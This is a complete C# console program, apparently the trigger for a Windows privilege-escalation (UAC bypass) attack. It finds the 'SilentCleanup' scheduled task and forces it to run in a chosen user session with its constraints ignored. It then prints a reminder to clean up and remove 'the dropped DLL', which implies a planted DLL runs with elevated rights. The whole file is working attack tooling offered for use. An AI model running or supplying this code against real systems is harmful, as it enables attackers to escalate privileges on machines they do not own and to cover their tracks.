using System;
using System.Text.RegularExpressions;
using Microsoft.Win32.TaskScheduler;

namespace SilentClean
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                var hostname = Environment.GetEnvironmentVariable("COMPUTERNAME");
                using (TaskService tasksrvc = new TaskService(@"\\"+ hostname, "", "", "", false))
                {
                    var task = tasksrvc.FindAllTasks(new Regex("SilentClean*"));
                    Console.WriteLine("\n[*] Starting Task");
                    int sessionId = 1;
                    if (args.Length > 0)
                    {
                        bool success = int.TryParse(args[0], out sessionId);
                        if (!success) //take 1 as default sessionID if the first cmdline argument isn't an integer. 
                        {
                            sessionId = 1; 
                        }
                    }
                    task[0].RunEx(TaskRunFlags.IgnoreConstraints | TaskRunFlags.UseSessionId, sessionId, "", "");
                    Console.WriteLine("\n[*] Make sure to clean-after yourself and remove the dropped DLL");
                }
            } catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Console.WriteLine(e.StackTrace);
            }
        }
    }
}
